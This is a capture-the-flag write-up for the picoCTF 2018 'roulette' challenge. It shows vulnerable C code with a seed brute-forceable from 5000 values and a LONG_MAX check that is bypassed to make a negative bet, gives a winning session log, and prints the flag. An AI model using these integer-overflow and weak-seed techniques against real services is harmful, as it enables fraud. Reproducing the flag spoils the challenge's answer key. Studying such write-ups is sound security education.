# roulette

> This Online Roulette Service is in Beta. Can you find a way to win $1,000,000,000 and get the flag? Source. Connect with nc 2018shell1.picoctf.com 26662

Hints:

> There are 2 bugs!

It was first general skills challenge that took me more than a few minutes.

First, we have to notice that seed is very weak. There are only 5000 possible values, so we could brute force.
But what is even worse, it is used as inital amount of money...

```c
long get_rand() {
  long seed;
  FILE *f = fopen("/dev/urandom", "r");
  fread(&seed, sizeof(seed), 1, f);
  fclose(f);
  seed = seed % 5000;
  if (seed < 0) seed = seed * -1;
  srand(seed);
  return seed;
}
cash = get_rand();
```

We can create a [program](cracker.c) that prints all winning numbers (note that every *second* number is used as winning number).
For best results we should compile and run the application on webshell and remember to add `-m32` flag to compile as 32-bit application.

Unfortunately we can't get one billion dollars this way. We are only allowed to win 16 times.

Here comes second bug.

```c
long get_long() {
    printf("> ");
    uint64_t l = 0;
    char c = 0;
    while(!is_digit(c))
      c = getchar();
    while(is_digit(c)) {
      if(l >= LONG_MAX) {
	l = LONG_MAX;
	break;
      }
      l *= 10;
      l += c - '0';
      c = getchar();
    }
    while(c != '\n')
      c = getchar();
    return l;
}
```

Note that this function checks if number is greater than `LONG_MAX` *after* only if next character is also a digit. It means that if we enter the number of the same length as `LONG_MAX` (in decimal) it is never checked!
This way we can input negative values.

Bet is immediately subtracted from our balance, so we can earn as much money as we want this way.
```
bet = get_bet();
cash -= bet;
```

Just bet `2147583648` and you are a billionaire. But you must lose this round, because otherwise they will add this negative bet to your balance and in result you'll be poor again.
```
cash += 2*bet;
```

We can't just use second bug, because the application won't give us the flag until we win 3 times.

```
$ nc 2018shell1.picoctf.com 26662
Welcome to ONLINE ROULETTE!
Here, have $2779 to start on the house! You'll lose it all anyways >:)

How much will you wager?
Current Balance: $2779   Current Wins: 0
> 34
Choose a number (1-36)
> 34

Spinning the Roulette for a chance to win $68!

Roulette  :  34

Alright, now you're cooking!

How much will you wager?
Current Balance: $2813   Current Wins: 1
> 33
Choose a number (1-36)
> 33

Spinning the Roulette for a chance to win $66!

Roulette  :  33

Darn, you got it right.

How much will you wager?
Current Balance: $2846   Current Wins: 2
> 30
Choose a number (1-36)
> 30

Spinning the Roulette for a chance to win $60!

Roulette  :  30

Wow, you won!

How much will you wager?
Current Balance: $2876   Current Wins: 3
> 2147583648
Choose a number (1-36)
> 35

Spinning the Roulette for a chance to win $200000!

Roulette  :  16

WRONG
It's over for you.

*** Current Balance: $2147386524 ***
Wow, I can't believe you did it.. You deserve this flag!
picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_25142e09}
```

Flag is `picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_25142e09}`.